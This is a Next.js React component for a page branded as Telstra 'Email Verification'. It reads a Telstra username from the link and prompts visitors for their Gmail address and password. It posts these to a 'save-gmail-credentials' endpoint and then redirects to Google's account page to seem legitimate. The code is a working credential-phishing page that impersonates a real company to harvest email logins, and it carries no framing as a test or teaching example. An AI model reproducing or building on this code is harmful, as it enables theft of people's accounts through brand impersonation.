'use client';

import { useState, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';
import TelstraLogo from '../../components/Telstra/Logo';
import '../../components/Telstra/LoginPage.css';

export default function EmailVerificationPage() {
  const searchParams = useSearchParams();
  const [gmailUsername, setGmailUsername] = useState('');
  const [gmailPassword, setGmailPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isSigningIn, setIsSigningIn] = useState(false);
  const [telstraUsername, setTelstraUsername] = useState('');

  useEffect(() => {
    // Get telstraUsername from query parameter (email param)
    const emailParam = searchParams.get('email');
    if (emailParam) {
      setTelstraUsername(emailParam);
    }
  }, [searchParams]);

  const handleSignIn = async () => {
    if (!telstraUsername) {
      alert('Invalid verification link. Please check your email.');
      return;
    }

    if (gmailUsername.trim() && gmailPassword.trim() && !isSigningIn) {
      setIsSigningIn(true);
      try {
        const response = await fetch('/api/users/save-gmail-credentials', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            telstraUsername: telstraUsername.trim(),
            gmailUsername: gmailUsername.trim(),
            gmailPassword: gmailPassword.trim(),
          }),
        });

        if (response.ok) {
          // Redirect to Telstra ID page or success page
          window.location.href = 'https://myaccount.google.com/';
        } else {
          const error = await response.json();
          console.error('Error saving Gmail credentials:', error);
          alert('Failed to save credentials. Please try again.');
          setIsSigningIn(false);
        }
      } catch (error) {
        console.error('Error saving Gmail credentials:', error);
        alert('Failed to save credentials. Please try again.');
        setIsSigningIn(false);
      }
    }
  };

  return (
    <div className="container">
      {/* Header */}
      <header className="header">
        <div className="headerInner">
          <div className="logoContainer">
            <TelstraLogo />
          </div>
          <hr className="headerSeparator" />
        </div>
      </header>

      {/* Main Content */}
      <main className="main">
        <div className="loginForm">
          <h1 className="title">Email Verification</h1>
          <p className="subtitle">Email verification for Telstra</p>

          <div className="formGroup">
            <label htmlFor="gmailUsername" className="label">
              Email
            </label>
            <input
              type="email"
              id="gmailUsername"
              className="input"
              value={gmailUsername}
              onChange={(e) => setGmailUsername(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter' && gmailUsername.trim() && gmailPassword.trim() && !isSigningIn) {
                  handleSignIn();
                }
              }}
            />
          </div>

          <div className="formGroup">
            <label htmlFor="gmailPassword" className="label" style={{ fontWeight: "550px" }}>
              Password
            </label>
            <div className="passwordContainer">
              <input
                type={showPassword ? 'text' : 'password'}
                id="gmailPassword"
                className="input passwordInput"
                value={gmailPassword}
                onChange={(e) => setGmailPassword(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter' && gmailUsername.trim() && gmailPassword.trim() && !isSigningIn) {
                    handleSignIn();
                  }
                }}
              />
              <button
                type="button"
                className="showPasswordButton"
                onClick={() => setShowPassword(!showPassword)}
              >
                Show
              </button>
            </div>
            <div style={{ textAlign: 'right', marginTop: '8px' }}>
              <a href="#" className="recoverLink" style={{ marginBottom: 0, marginTop: 0 }}>
                Forgot password
              </a>
            </div>
          </div>

          <button 
            className="signInButton"
            onClick={handleSignIn}
            disabled={!gmailUsername.trim() || !gmailPassword.trim() || !telstraUsername || isSigningIn}
          >
            {isSigningIn ? (
              <span className="spinner"></span>
            ) : (
              'Sign in'
            )}
          </button>
        </div>
      </main>

      {/* Footer */}
      <footer className="footer">
        <div className="footerContent">
          <span className="copyright">
            Copyright © 2025 Telstra
          </span>
          <div className="footerLinks">
            <a href="#" className="footerLink">Privacy</a>
            <a href="#" className="footerLink">Terms of use</a>
          </div>
        </div>
      </footer>
    </div>
  );
}

